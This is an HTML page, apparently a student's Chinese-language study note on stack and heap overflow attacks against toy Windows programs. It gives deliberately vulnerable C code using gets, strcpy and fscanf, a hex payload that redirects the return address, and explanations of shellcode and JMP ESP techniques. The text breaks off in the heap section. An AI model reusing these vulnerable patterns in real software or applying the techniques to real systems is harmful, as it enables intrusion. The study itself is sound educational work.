@@ -1,0 +1,1089 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<!-- 2022-08-24 Wed 23:58 -->
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>堆栈溢出攻击</title>
+<meta name="author" content="Honbey Zhang" />
+<meta name="generator" content="Org Mode" />
+<style>
+  #content { max-width: 60em; margin: auto; }
+  .title  { text-align: center;
+             margin-bottom: .2em; }
+  .subtitle { text-align: center;
+              font-size: medium;
+              font-weight: bold;
+              margin-top:0; }
+  .todo   { font-family: monospace; color: red; }
+  .done   { font-family: monospace; color: green; }
+  .priority { font-family: monospace; color: orange; }
+  .tag    { background-color: #eee; font-family: monospace;
+            padding: 2px; font-size: 80%; font-weight: normal; }
+  .timestamp { color: #bebebe; }
+  .timestamp-kwd { color: #5f9ea0; }
+  .org-right  { margin-left: auto; margin-right: 0px;  text-align: right; }
+  .org-left   { margin-left: 0px;  margin-right: auto; text-align: left; }
+  .org-center { margin-left: auto; margin-right: auto; text-align: center; }
+  .underline { text-decoration: underline; }
+  #postamble p, #preamble p { font-size: 90%; margin: .2em; }
+  p.verse { margin-left: 3%; }
+  pre {
+    border: 1px solid #e6e6e6;
+    border-radius: 3px;
+    background-color: #f2f2f2;
+    padding: 8pt;
+    font-family: monospace;
+    overflow: auto;
+    margin: 1.2em;
+  }
+  pre.src {
+    position: relative;
+    overflow: auto;
+  }
+  pre.src:before {
+    display: none;
+    position: absolute;
+    top: -8px;
+    right: 12px;
+    padding: 3px;
+    color: #555;
+    background-color: #f2f2f299;
+  }
+  pre.src:hover:before { display: inline; margin-top: 14px;}
+  /* Languages per Org manual */
+  pre.src-asymptote:before { content: 'Asymptote'; }
+  pre.src-awk:before { content: 'Awk'; }
+  pre.src-authinfo::before { content: 'Authinfo'; }
+  pre.src-C:before { content: 'C'; }
+  /* pre.src-C++ doesn't work in CSS */
+  pre.src-clojure:before { content: 'Clojure'; }
+  pre.src-css:before { content: 'CSS'; }
+  pre.src-D:before { content: 'D'; }
+  pre.src-ditaa:before { content: 'ditaa'; }
+  pre.src-dot:before { content: 'Graphviz'; }
+  pre.src-calc:before { content: 'Emacs Calc'; }
+  pre.src-emacs-lisp:before { content: 'Emacs Lisp'; }
+  pre.src-fortran:before { content: 'Fortran'; }
+  pre.src-gnuplot:before { content: 'gnuplot'; }
+  pre.src-haskell:before { content: 'Haskell'; }
+  pre.src-hledger:before { content: 'hledger'; }
+  pre.src-java:before { content: 'Java'; }
+  pre.src-js:before { content: 'Javascript'; }
+  pre.src-latex:before { content: 'LaTeX'; }
+  pre.src-ledger:before { content: 'Ledger'; }
+  pre.src-lisp:before { content: 'Lisp'; }
+  pre.src-lilypond:before { content: 'Lilypond'; }
+  pre.src-lua:before { content: 'Lua'; }
+  pre.src-matlab:before { content: 'MATLAB'; }
+  pre.src-mscgen:before { content: 'Mscgen'; }
+  pre.src-ocaml:before { content: 'Objective Caml'; }
+  pre.src-octave:before { content: 'Octave'; }
+  pre.src-org:before { content: 'Org mode'; }
+  pre.src-oz:before { content: 'OZ'; }
+  pre.src-plantuml:before { content: 'Plantuml'; }
+  pre.src-processing:before { content: 'Processing.js'; }
+  pre.src-python:before { content: 'Python'; }
+  pre.src-R:before { content: 'R'; }
+  pre.src-ruby:before { content: 'Ruby'; }
+  pre.src-sass:before { content: 'Sass'; }
+  pre.src-scheme:before { content: 'Scheme'; }
+  pre.src-screen:before { content: 'Gnu Screen'; }
+  pre.src-sed:before { content: 'Sed'; }
+  pre.src-sh:before { content: 'shell'; }
+  pre.src-sql:before { content: 'SQL'; }
+  pre.src-sqlite:before { content: 'SQLite'; }
+  /* additional languages in org.el's org-babel-load-languages alist */
+  pre.src-forth:before { content: 'Forth'; }
+  pre.src-io:before { content: 'IO'; }
+  pre.src-J:before { content: 'J'; }
+  pre.src-makefile:before { content: 'Makefile'; }
+  pre.src-maxima:before { content: 'Maxima'; }
+  pre.src-perl:before { content: 'Perl'; }
+  pre.src-picolisp:before { content: 'Pico Lisp'; }
+  pre.src-scala:before { content: 'Scala'; }
+  pre.src-shell:before { content: 'Shell Script'; }
+  pre.src-ebnf2ps:before { content: 'ebfn2ps'; }
+  /* additional language identifiers per "defun org-babel-execute"
+       in ob-*.el */
+  pre.src-cpp:before  { content: 'C++'; }
+  pre.src-abc:before  { content: 'ABC'; }
+  pre.src-coq:before  { content: 'Coq'; }
+  pre.src-groovy:before  { content: 'Groovy'; }
+  /* additional language identifiers from org-babel-shell-names in
+     ob-shell.el: ob-shell is the only babel language using a lambda to put
+     the execution function name together. */
+  pre.src-bash:before  { content: 'bash'; }
+  pre.src-csh:before  { content: 'csh'; }
+  pre.src-ash:before  { content: 'ash'; }
+  pre.src-dash:before  { content: 'dash'; }
+  pre.src-ksh:before  { content: 'ksh'; }
+  pre.src-mksh:before  { content: 'mksh'; }
+  pre.src-posh:before  { content: 'posh'; }
+  /* Additional Emacs modes also supported by the LaTeX listings package */
+  pre.src-ada:before { content: 'Ada'; }
+  pre.src-asm:before { content: 'Assembler'; }
+  pre.src-caml:before { content: 'Caml'; }
+  pre.src-delphi:before { content: 'Delphi'; }
+  pre.src-html:before { content: 'HTML'; }
+  pre.src-idl:before { content: 'IDL'; }
+  pre.src-mercury:before { content: 'Mercury'; }
+  pre.src-metapost:before { content: 'MetaPost'; }
+  pre.src-modula-2:before { content: 'Modula-2'; }
+  pre.src-pascal:before { content: 'Pascal'; }
+  pre.src-ps:before { content: 'PostScript'; }
+  pre.src-prolog:before { content: 'Prolog'; }
+  pre.src-simula:before { content: 'Simula'; }
+  pre.src-tcl:before { content: 'tcl'; }
+  pre.src-tex:before { content: 'TeX'; }
+  pre.src-plain-tex:before { content: 'Plain TeX'; }
+  pre.src-verilog:before { content: 'Verilog'; }
+  pre.src-vhdl:before { content: 'VHDL'; }
+  pre.src-xml:before { content: 'XML'; }
+  pre.src-nxml:before { content: 'XML'; }
+  /* add a generic configuration mode; LaTeX export needs an additional
+     (add-to-list 'org-latex-listings-langs '(conf " ")) in .emacs */
+  pre.src-conf:before { content: 'Configuration File'; }
+
+  table { border-collapse:collapse; }
+  caption.t-above { caption-side: top; }
+  caption.t-bottom { caption-side: bottom; }
+  td, th { vertical-align:top;  }
+  th.org-right  { text-align: center;  }
+  th.org-left   { text-align: center;   }
+  th.org-center { text-align: center; }
+  td.org-right  { text-align: right;  }
+  td.org-left   { text-align: left;   }
+  td.org-center { text-align: center; }
+  dt { font-weight: bold; }
+  .footpara { display: inline; }
+  .footdef  { margin-bottom: 1em; }
+  .figure { padding: 1em; }
+  .figure p { text-align: center; }
+  .equation-container {
+    display: table;
+    text-align: center;
+    width: 100%;
+  }
+  .equation {
+    vertical-align: middle;
+  }
+  .equation-label {
+    display: table-cell;
+    text-align: right;
+    vertical-align: middle;
+  }
+  .inlinetask {
+    padding: 10px;
+    border: 2px solid gray;
+    margin: 10px;
+    background: #ffffcc;
+  }
+  #org-div-home-and-up
+   { text-align: right; font-size: 70%; white-space: nowrap; }
+  textarea { overflow-x: auto; }
+  .linenr { font-size: smaller }
+  .code-highlighted { background-color: #ffff00; }
+  .org-info-js_info-navigation { border-style: none; }
+  #org-info-js_console-label
+    { font-size: 10px; font-weight: bold; white-space: nowrap; }
+  .org-info-js_search-highlight
+    { background-color: #ffff00; color: #000000; font-weight: bold; }
+  .org-svg { }
+</style>
+<link rel="stylesheet"
+                    href="../resources/style.css"
+                    type="text/css"/>
+</head>
+<body>
+<div id="content" class="content">
+<header>
+<h1 class="title">堆栈溢出攻击</h1>
+</header>
+<div id="outline-container-ID-d78e2c33-6a72-4cd7-8e8e-0c76b9e2c281" class="outline-2">
+<h2 id="ID-d78e2c33-6a72-4cd7-8e8e-0c76b9e2c281">栈溢出</h2>
+<div class="outline-text-2" id="text-orgb815401">
+<p>
+内存和寄存器的知识：<a href="memory_and_register.html#ID-2fee860b-01d1-48e5-a19c-8df0d5ffa346">软件安全 - 内存与寄存器</a>
+</p>
+</div>
+
+<div id="outline-container-ID-0c6a4a3b-bcc6-461c-a5db-118fdf4cdfa2" class="outline-3">
+<h3 id="ID-0c6a4a3b-bcc6-461c-a5db-118fdf4cdfa2">寻找栈溢出</h3>
+<div class="outline-text-3" id="text-orgac34d34">
+<div class="org-src-container">
+<pre class="src src-c"><span style="color: #808080;">#include</span> <span style="color: #707183;">&lt;</span><span style="color: #008000;">stdio.h</span><span style="color: #707183;">&gt;</span>
+<span style="color: #808080;">#include</span> <span style="color: #707183;">&lt;</span><span style="color: #008000;">string.h</span><span style="color: #707183;">&gt;</span>
+
+<span style="color: #6434A3;">void</span> <span style="color: #006699;">fun</span><span style="color: #707183;">()</span> <span style="color: #707183;">{</span>
+    <span style="color: #6434A3;">char</span> <span style="color: #BA36A5;">s_passwd</span><span style="color: #7388D6;">[</span><span style="color: #D0372D;">6</span><span style="color: #7388D6;">]</span> = <span style="color: #008000;">"ABCDE"</span>;
+    <span style="color: #6434A3;">char</span> <span style="color: #BA36A5;">str</span><span style="color: #7388D6;">[</span><span style="color: #D0372D;">6</span><span style="color: #7388D6;">]</span>;
+    gets<span style="color: #7388D6;">(</span>str<span style="color: #7388D6;">)</span>;
+    str<span style="color: #7388D6;">[</span><span style="color: #D0372D;">5</span><span style="color: #7388D6;">]</span> = <span style="color: #D0372D;">0</span>;
+    <span style="color: #0000FF;">if</span><span style="color: #7388D6;">(</span>strcmp<span style="color: #909183;">(</span>str, s_passwd<span style="color: #909183;">)</span> == <span style="color: #D0372D;">0</span><span style="color: #7388D6;">)</span> printf<span style="color: #7388D6;">(</span><span style="color: #008000;">"OK\n"</span><span style="color: #7388D6;">)</span>;
+    <span style="color: #0000FF;">else</span> printf<span style="color: #7388D6;">(</span><span style="color: #008000;">"NO\n"</span><span style="color: #7388D6;">)</span>;
+<span style="color: #707183;">}</span>
+
+<span style="color: #6434A3;">int</span> <span style="color: #006699;">main</span><span style="color: #707183;">(</span><span style="color: #6434A3;">int</span> <span style="color: #BA36A5;">argc</span>, <span style="color: #6434A3;">char</span> <span style="color: #0000FF;">const</span> *<span style="color: #BA36A5;">argv</span><span style="color: #7388D6;">[]</span><span style="color: #707183;">)</span> <span style="color: #707183;">{</span>
+    fun<span style="color: #7388D6;">()</span>;
+    <span style="color: #0000FF;">return</span> <span style="color: #D0372D;">0</span>;
+<span style="color: #707183;">}</span>
+</pre>
+</div>
+</div>
+
+<div id="outline-container-orgb9957bf" class="outline-4">
+<h4 id="orgb9957bf">二进制分析</h4>
+<div class="outline-text-4" id="text-orgb9957bf">
+<p>
+正常运行结果：
+</p>
+
+<figure id="orgd2976b4">
+<img src="../images/overflow_attack_binary_analysis_1_1_1.png" alt="overflow_attack_binary_analysis_1_1_1.png">
+
+</figure>
+
+<figure id="org7acdd57">
+<img src="../images/overflow_attack_binary_analysis_1_1_2.png" alt="overflow_attack_binary_analysis_1_1_2.png">
+
+</figure>
+
+<figure id="org7d3467a">
+<img src="../images/overflow_attack_binary_analysis_1_1_3.png" alt="overflow_attack_binary_analysis_1_1_3.png">
+
+</figure>
+
+<p>
+利用特意构建得字符串覆盖正常的内存区域，以跳过密码验证。此时原先正常的内存区域被溢出的字符串覆盖，原来的字符串被修改成“aaaaa”密码验证通过，下图为实际运行过程中的内存，很奇怪的是 0x12ff28 处不是 61000000，而是一个 RET 返回地址，感觉是这是系统一种异常处理机制或者是栈帧移动
+</p>
+
+<figure id="org84a1af1">
+<img src="../images/overflow_attack_binary_analysis_1_2_1.png" alt="overflow_attack_binary_analysis_1_2_1.png">
+
+</figure>
+
+<figure id="org90b5d73">
+<img src="../images/overflow_attack_binary_analysis_1_2_2.png" alt="overflow_attack_binary_analysis_1_2_2.png">
+
+</figure>
+
+<p>
+输入 23 个字符的情况，导致这一块内存区域被置零，应该是触发了 Windows 或 VC 的一场处理。但是寄存器还是接受到了这些值，EIP 和 EBP 都指向了一个不存在的内存地址，导致程序异常而出现错误代码提示。
+</p>
+
+<figure id="org2873e0f">
+<img src="../images/overflow_attack_binary_analysis_1_3_1.png" alt="overflow_attack_binary_analysis_1_3_1.png">
+
+</figure>
+
+<figure id="org7101193">
+<img src="../images/overflow_attack_binary_analysis_1_3_2.png" alt="overflow_attack_binary_analysis_1_3_2.png">
+
+</figure>
+
+<figure id="org0a51299">
+<img src="../images/overflow_attack_binary_analysis_1_3_3.png" alt="overflow_attack_binary_analysis_1_3_3.png">
+
+</figure>
+</div>
+</div>
+</div>
+
+<div id="outline-container-org2738ce4" class="outline-3">
+<h3 id="org2738ce4">利用 RET 进行栈溢出攻击</h3>
+<div class="outline-text-3" id="text-org2738ce4">
+<div class="org-src-container">
+<pre class="src src-c"><span style="color: #808080;">#include</span> <span style="color: #707183;">&lt;</span><span style="color: #008000;">stdio.h</span><span style="color: #707183;">&gt;</span>
+<span style="color: #808080;">#include</span> <span style="color: #707183;">&lt;</span><span style="color: #008000;">string.h</span><span style="color: #707183;">&gt;</span>
+<span style="color: #808080;">#include</span> <span style="color: #707183;">&lt;</span><span style="color: #008000;">stdlib.h</span><span style="color: #707183;">&gt;</span>
+
+<span style="color: #6434A3;">void</span> <span style="color: #006699;">Attack</span><span style="color: #707183;">()</span> <span style="color: #707183;">{</span>
+    printf<span style="color: #7388D6;">(</span><span style="color: #008000;">"Hello!:-)\n"</span><span style="color: #7388D6;">)</span>;
+    exit<span style="color: #7388D6;">(</span><span style="color: #D0372D;">0</span><span style="color: #7388D6;">)</span>;
+<span style="color: #707183;">}</span>
+
+<span style="color: #6434A3;">void</span> <span style="color: #006699;">fun</span><span style="color: #707183;">()</span> <span style="color: #707183;">{</span>
+    <span style="color: #6434A3;">char</span> <span style="color: #BA36A5;">s_passwd</span><span style="color: #7388D6;">[</span><span style="color: #D0372D;">6</span><span style="color: #7388D6;">]</span> = <span style="color: #008000;">"ABCDE"</span>;
+    <span style="color: #6434A3;">char</span> <span style="color: #BA36A5;">str</span><span style="color: #7388D6;">[</span><span style="color: #D0372D;">6</span><span style="color: #7388D6;">]</span>;
+    <span style="color: #6434A3;">FILE</span> *<span style="color: #BA36A5;">f_o</span>;
+    <span style="color: #0000FF;">if</span><span style="color: #7388D6;">(</span>!<span style="color: #909183;">(</span>f_o = fopen<span style="color: #709870;">(</span><span style="color: #008000;">"C:\\Program Files\\Microsoft Visual Studio\\MyProjects\\reverseProject\\Debug\\passwd.txt"</span>, <span style="color: #008000;">"r"</span><span style="color: #709870;">)</span><span style="color: #909183;">)</span><span style="color: #7388D6;">)</span> exit<span style="color: #7388D6;">(</span><span style="color: #D0372D;">0</span><span style="color: #7388D6;">)</span>;
+    fscanf<span style="color: #7388D6;">(</span>f_o, <span style="color: #008000;">"%s"</span>, str<span style="color: #7388D6;">)</span>;
+
+    str<span style="color: #7388D6;">[</span><span style="color: #D0372D;">5</span><span style="color: #7388D6;">]</span> = <span style="color: #D0372D;">0</span>;
+    <span style="color: #0000FF;">if</span><span style="color: #7388D6;">(</span>strcmp<span style="color: #909183;">(</span>str, s_passwd<span style="color: #909183;">)</span> == <span style="color: #D0372D;">0</span><span style="color: #7388D6;">)</span> printf<span style="color: #7388D6;">(</span><span style="color: #008000;">"OK\n"</span><span style="color: #7388D6;">)</span>;
+    <span style="color: #0000FF;">else</span> printf<span style="color: #7388D6;">(</span><span style="color: #008000;">"NO\n"</span><span style="color: #7388D6;">)</span>;
+<span style="color: #707183;">}</span>
+
+<span style="color: #6434A3;">int</span> <span style="color: #006699;">main</span><span style="color: #707183;">(</span><span style="color: #6434A3;">int</span> <span style="color: #BA36A5;">argc</span>, <span style="color: #6434A3;">char</span> <span style="color: #0000FF;">const</span> *<span style="color: #BA36A5;">argv</span><span style="color: #7388D6;">[]</span><span style="color: #707183;">)</span> <span style="color: #707183;">{</span>
+    fun<span style="color: #7388D6;">()</span>;
+    <span style="color: #0000FF;">return</span> <span style="color: #D0372D;">0</span>;
+<span style="color: #707183;">}</span>
+</pre>
+</div>
+</div>
+
+<div id="outline-container-org31bd60e" class="outline-4">
+<h4 id="org31bd60e">二进制分析</h4>
+<div class="outline-text-4" id="text-org31bd60e">
+<p>
+修改返回地址执行使得程序转而执行 Attack()。
+正常运行结果（左），攻击后运行结果（右）：
+</p>
+
+<table>
+
+
+<colgroup>
+<col  class="org-left">
+
+<col  class="org-left">
+</colgroup>
+<tbody>
+<tr>
+<td class="org-left"><img src="../images/overflow_attack_binary_analysis_2_1_1.png" alt="overflow_attack_binary_analysis_2_1_1.png"></td>
+<td class="org-left"><img src="../images/overflow_attack_binary_analysis_2_1_2.png" alt="overflow_attack_binary_analysis_2_1_2.png"></td>
+</tr>
+</tbody>
+</table>
+
+<p>
+EIP 指向 Attack() 函数的入口地址，这是通过精心构造的 passwd.txt 文件实现的，输入了 23 个字符，根据正常的 RET 位置，我修改了文件的后 3 个字符为十六进制的 301040 即 Attack() 函数的入口地址 0x401030，以此覆盖原来正常的 RET 地址，原 RET 地址是指向 main() 函数，覆盖后程序在执行完 fun() 函数后继而执行 Attack() 函数，这样 VC 6.0 没有报错，因为覆盖后的地址是存在且可执行的，之后 exit(0) ，程序正常结束，像是正常运行结束一样。
+</p>
+
+<p>
+passwd.txt
+</p>
+
+
+<figure id="org4399f57">
+<img src="../images/overflow_attack_binary_analysis_2_2.png" alt="overflow_attack_binary_analysis_2_2.png">
+
+</figure>
+
+<div class="org-src-container">
+<pre class="src src-hexadecimal">// passwd.txt(Hex)
+6161 6161 6262 6262 6363 6363 6464 6464
+6565 6565 3010 40
+</pre>
+</div>
+
+<table>
+
+
+<colgroup>
+<col  class="org-left">
+
+<col  class="org-left">
+</colgroup>
+<tbody>
+<tr>
+<td class="org-left"><img src="../images/overflow_attack_binary_analysis_2_3_1.png" alt="overflow_attack_binary_analysis_2_3_1.png"></td>
+<td class="org-left">&#xa0;</td>
+</tr>
+
+<tr>
+<td class="org-left"><img src="../images/overflow_attack_binary_analysis_2_3_2.png" alt="overflow_attack_binary_analysis_2_3_2.png"></td>
+<td class="org-left"><img src="../images/overflow_attack_binary_analysis_2_3_3.png" alt="overflow_attack_binary_analysis_2_3_3.png"></td>
+</tr>
+</tbody>
+</table>
+
+<p>
+这种攻击修改了 RET 地址，让正常的程序转而执行事先设计的一个地址的指令，而且让 VC 没有报错。
+</p>
+</div>
+</div>
+</div>
+
+<div id="outline-container-ID-ed55fe81-c90c-4654-bb8d-95580aba6b73" class="outline-3">
+<h3 id="ID-ed55fe81-c90c-4654-bb8d-95580aba6b73">利用 Shellcode 进行栈溢出攻击</h3>
+<div class="outline-text-3" id="text-orgdc7c7b4">
+<div class="org-src-container">
+<pre class="src src-c"><span style="color: #808080;">#include</span> <span style="color: #707183;">&lt;</span><span style="color: #008000;">stdio.h</span><span style="color: #707183;">&gt;</span>
+<span style="color: #808080;">#include</span> <span style="color: #707183;">&lt;</span><span style="color: #008000;">stdlib.h</span><span style="color: #707183;">&gt;</span>
+<span style="color: #808080;">#include</span> <span style="color: #707183;">&lt;</span><span style="color: #008000;">string.h</span><span style="color: #707183;">&gt;</span>
+<span style="color: #808080;">#include</span> <span style="color: #707183;">&lt;</span><span style="color: #008000;">windows.h</span><span style="color: #707183;">&gt;</span>
+
+<span style="color: #808080;">#define</span> <span style="color: #BA36A5;">PASSWD</span> <span style="color: #008000;">"1234567"</span>
+
+<span style="color: #6434A3;">int</span> <span style="color: #006699;">verify_passwd</span><span style="color: #707183;">(</span><span style="color: #6434A3;">char</span> *<span style="color: #BA36A5;">passwd</span><span style="color: #707183;">)</span> <span style="color: #707183;">{</span>
+    <span style="color: #6434A3;">int</span> <span style="color: #BA36A5;">authenticated</span>;
+    <span style="color: #6434A3;">char</span> <span style="color: #BA36A5;">buffer</span><span style="color: #7388D6;">[</span><span style="color: #D0372D;">44</span><span style="color: #7388D6;">]</span>;
+    authenticated = strcmp<span style="color: #7388D6;">(</span>passwd, <span style="color: #D0372D;">PASSWD</span><span style="color: #7388D6;">)</span>;
+    strcpy<span style="color: #7388D6;">(</span>buffer, passwd<span style="color: #7388D6;">)</span>;
+    <span style="color: #0000FF;">return</span> authenticated;
+<span style="color: #707183;">}</span>
+
+<span style="color: #006699;">main</span><span style="color: #707183;">(</span><span style="color: #6434A3;">int</span> <span style="color: #BA36A5;">argc</span>, <span style="color: #6434A3;">char</span>* <span style="color: #BA36A5;">argv</span><span style="color: #7388D6;">[]</span><span style="color: #707183;">)</span> <span style="color: #707183;">{</span>
+    <span style="color: #6434A3;">int</span> <span style="color: #BA36A5;">valid_flag</span> = <span style="color: #D0372D;">0</span>;
+    <span style="color: #6434A3;">char</span> <span style="color: #BA36A5;">passwd</span><span style="color: #7388D6;">[</span><span style="color: #D0372D;">1024</span><span style="color: #7388D6;">]</span>;
+    <span style="color: #6434A3;">FILE</span> *<span style="color: #BA36A5;">fp</span>;
+    LoadLibrary<span style="color: #7388D6;">(</span><span style="color: #008000;">"user32.dll"</span><span style="color: #7388D6;">)</span>;
+    <span style="color: #0000FF;">if</span><span style="color: #7388D6;">(</span>!<span style="color: #909183;">(</span>fp = fopen<span style="color: #709870;">(</span><span style="color: #008000;">"passwd.txt"</span>, <span style="color: #008000;">"r"</span><span style="color: #709870;">)</span><span style="color: #909183;">)</span><span style="color: #7388D6;">)</span> exit<span style="color: #7388D6;">(</span><span style="color: #D0372D;">0</span><span style="color: #7388D6;">)</span>;
+    <span style="color: #8D8D84;">// </span><span style="color: #8D8D84; font-style: italic;">fscanf(fp, "%s", passwd); // &#25105;&#20351;&#29992;fscanf()&#20989;&#25968;&#25915;&#20987;&#19981;&#25104;&#21151;&#65292;fscanf()&#24635;&#26159;&#21482;&#35835;&#21462;passwd.txt&#25991;&#20214;&#30340;&#21069;20&#20010;&#23383;&#33410;</span>
+    <span style="color: #8D8D84;">// </span><span style="color: #8D8D84; font-style: italic;">&#20351;&#29992;fgets()&#20989;&#25968;&#21487;&#20197;&#25915;&#20987;&#25104;&#21151;</span>
+    fgets<span style="color: #7388D6;">(</span>passwd, <span style="color: #D0372D;">100</span>, fp<span style="color: #7388D6;">)</span>;
+    valid_flag = verify_passwd<span style="color: #7388D6;">(</span>passwd<span style="color: #7388D6;">)</span>;
+    <span style="color: #0000FF;">if</span><span style="color: #7388D6;">(</span>valid_flag<span style="color: #7388D6;">)</span> printf<span style="color: #7388D6;">(</span><span style="color: #008000;">"Incorrect password!\n"</span><span style="color: #7388D6;">)</span>;
+    <span style="color: #0000FF;">else</span> printf<span style="color: #7388D6;">(</span><span style="color: #008000;">"Congratulation! You have passed the verification!\n"</span><span style="color: #7388D6;">)</span>;
+    fclose<span style="color: #7388D6;">(</span>fp<span style="color: #7388D6;">)</span>;
+    <span style="color: #0000FF;">return</span> <span style="color: #D0372D;">0</span>;
+<span style="color: #707183;">}</span>
+</pre>
+</div>
+</div>
+
+<div id="outline-container-org1400728" class="outline-4">
+<h4 id="org1400728">二进制分析</h4>
+<div class="outline-text-4" id="text-org1400728">
+<p>
+使用 Depends 获取到 MessageBoxA 函数的入口地址
+</p>
+
+<figure id="orgaaf59b5">
+<img src="../images/overflow_attack_binary_analysis_3_1.png" alt="overflow_attack_binary_analysis_3_1.png">
+
+</figure>
+
+<p>
+调试程序，获取 buffer 的地址
+</p>
+<table>
+
+
+<colgroup>
+<col  class="org-left">
+
+<col  class="org-left">
+</colgroup>
+<tbody>
+<tr>
+<td class="org-left"><img src="../images/overflow_attack_binary_analysis_3_2_1.png" alt="overflow_attack_binary_analysis_3_2_1.png"></td>
+<td class="org-left"><img src="../images/overflow_attack_binary_analysis_3_2_2.png" alt="overflow_attack_binary_analysis_3_2_2.png"></td>
+</tr>
+</tbody>
+</table>
+
+<p>
+设计 passwd 文件
+</p>
+
+<figure id="orgaf13bed">
+<img src="../images/overflow_attack_binary_analysis_3_3.png" alt="overflow_attack_binary_analysis_3_3.png">
+
+</figure>
+
+<p>
+成功实现了代码注入，弹出了一个对话框
+</p>
+<table>
+
+
+<colgroup>
+<col  class="org-left">
+
+<col  class="org-left">
+</colgroup>
+<tbody>
+<tr>
+<td class="org-left"><img src="../images/overflow_attack_binary_analysis_3_4_1.png" alt="overflow_attack_binary_analysis_3_4_1.png"></td>
+<td class="org-left"><img src="../images/overflow_attack_binary_analysis_3_4_2.png" alt="overflow_attack_binary_analysis_3_4_2.png"></td>
+</tr>
+</tbody>
+</table>
+
+<figure id="org55c7ca5">
+<img src="../images/overflow_attack_binary_analysis_3_4_3.png" alt="overflow_attack_binary_analysis_3_4_3.png">
+
+</figure>
+</div>
+</div>
+</div>
+
+<div id="outline-container-org9242536" class="outline-3">
+<h3 id="org9242536">利用 JMP ESP 进行栈溢出攻击</h3>
+<div class="outline-text-3" id="text-org9242536">
+<div class="org-src-container">
+<pre class="src src-c"><span style="color: #808080;">#include</span> <span style="color: #707183;">&lt;</span><span style="color: #008000;">stdio.h</span><span style="color: #707183;">&gt;</span>
+<span style="color: #808080;">#include</span> <span style="color: #707183;">&lt;</span><span style="color: #008000;">stdlib.h</span><span style="color: #707183;">&gt;</span>
+<span style="color: #808080;">#include</span> <span style="color: #707183;">&lt;</span><span style="color: #008000;">string.h</span><span style="color: #707183;">&gt;</span>
+<span style="color: #808080;">#include</span> <span style="color: #707183;">&lt;</span><span style="color: #008000;">windows.h</span><span style="color: #707183;">&gt;</span>
+
+<span style="color: #6434A3;">void</span> <span style="color: #006699;">Attack</span><span style="color: #707183;">()</span> <span style="color: #707183;">{</span>
+    printf<span style="color: #7388D6;">(</span><span style="color: #008000;">"Hello!:-)\n"</span><span style="color: #7388D6;">)</span>;
+    exit<span style="color: #7388D6;">(</span><span style="color: #D0372D;">0</span><span style="color: #7388D6;">)</span>;
+<span style="color: #707183;">}</span>
+
+<span style="color: #6434A3;">void</span> <span style="color: #006699;">fun</span><span style="color: #707183;">()</span> <span style="color: #707183;">{</span>
+    <span style="color: #6434A3;">char</span> <span style="color: #BA36A5;">passwd</span><span style="color: #7388D6;">[</span><span style="color: #D0372D;">6</span><span style="color: #7388D6;">]</span> = <span style="color: #008000;">"ABCDE"</span>;
+    <span style="color: #6434A3;">char</span> <span style="color: #BA36A5;">str</span><span style="color: #7388D6;">[</span><span style="color: #D0372D;">6</span><span style="color: #7388D6;">]</span>;
+    <span style="color: #6434A3;">FILE</span> *<span style="color: #BA36A5;">fp</span>;
+    <span style="color: #0000FF;">if</span> <span style="color: #7388D6;">(</span>!<span style="color: #909183;">(</span>fp = fopen<span style="color: #709870;">(</span><span style="color: #008000;">"passwd.txt"</span>, <span style="color: #008000;">"r"</span><span style="color: #709870;">)</span><span style="color: #909183;">)</span><span style="color: #7388D6;">)</span> exit<span style="color: #7388D6;">(</span><span style="color: #D0372D;">0</span><span style="color: #7388D6;">)</span>;
+
+    fscanf<span style="color: #7388D6;">(</span>fp, <span style="color: #008000;">"%s"</span>, str<span style="color: #7388D6;">)</span>;
+
+    str<span style="color: #7388D6;">[</span><span style="color: #D0372D;">5</span><span style="color: #7388D6;">]</span> = <span style="color: #D0372D;">0</span>;
+    <span style="color: #0000FF;">if</span> <span style="color: #7388D6;">(</span>strcmp<span style="color: #909183;">(</span>str, passwd<span style="color: #909183;">)</span> == <span style="color: #D0372D;">0</span><span style="color: #7388D6;">)</span> printf<span style="color: #7388D6;">(</span><span style="color: #008000;">"OK!\n"</span><span style="color: #7388D6;">)</span>;
+    <span style="color: #0000FF;">else</span> printf<span style="color: #7388D6;">(</span><span style="color: #008000;">"NO!\n"</span><span style="color: #7388D6;">)</span>;
+<span style="color: #707183;">}</span>
+
+<span style="color: #6434A3;">int</span> <span style="color: #006699;">main</span><span style="color: #707183;">(</span><span style="color: #6434A3;">int</span> <span style="color: #BA36A5;">argc</span>, <span style="color: #6434A3;">char</span> <span style="color: #0000FF;">const</span> *<span style="color: #BA36A5;">argv</span><span style="color: #7388D6;">[]</span><span style="color: #707183;">)</span> <span style="color: #707183;">{</span>
+    LoadLibrary<span style="color: #7388D6;">(</span><span style="color: #008000;">"user32.dll"</span><span style="color: #7388D6;">)</span>;
+    fun<span style="color: #7388D6;">()</span>;
+    <span style="color: #0000FF;">return</span> <span style="color: #D0372D;">0</span>;
+<span style="color: #707183;">}</span>
+</pre>
+</div>
+</div>
+
+<div id="outline-container-orgbefa462" class="outline-4">
+<h4 id="orgbefa462">二进制分析-4</h4>
+<div class="outline-text-4" id="text-orgbefa462">
+<p>
+相比 3 （<a href="#ID-ed55fe81-c90c-4654-bb8d-95580aba6b73">利用 Shellcode 进行攻击</a>） 的改进： <b><b>程序可以正常退出。</b></b>
+参考 3 中的 Depend 找到 exitThread （或类似）函数的地址。
+</p>
+
+<p>
+找到一个 JMP ESP 指令的地址
+</p>
+
+<figure id="orgcb73ff8">
+<img src="../images/overflow_attack_binary_analysis_4_1.png" alt="overflow_attack_binary_analysis_4_1.png">
+
+</figure>
+
+
+<p>
+<b><b>构造 shellcode</b></b>:
+最主要的是要让函数的返回地址改成 JMP ESP 的地址，让程序跳转到 esp 之后往下执行，最后调用 exitThread 函数，使得函数正常退出，完成代码注入
+</p>
+
+<figure id="org823362e">
+<img src="../images/overflow_attack_binary_analysis_4_2.png" alt="overflow_attack_binary_analysis_4_2.png">
+
+</figure>
+
+
+<figure id="orga96eb62">
+<img src="../images/overflow_attack_binary_analysis_4_3.png" alt="overflow_attack_binary_analysis_4_3.png">
+
+</figure>
+</div>
+</div>
+</div>
+</div>
+
+
+<div id="outline-container-orga1c3c5c" class="outline-2">
+<h2 id="orga1c3c5c">堆溢出</h2>
+<div class="outline-text-2" id="text-orga1c3c5c">
+<p>
+堆块示意图：
+</p>
+
+<figure id="orge49fe07">
+<img src="../images/overflow_attack_heap_overflow_1.png" alt="overflow_attack_heap_overflow_1.png">
+
+</figure>
+
+
+<p>
+操作示例：
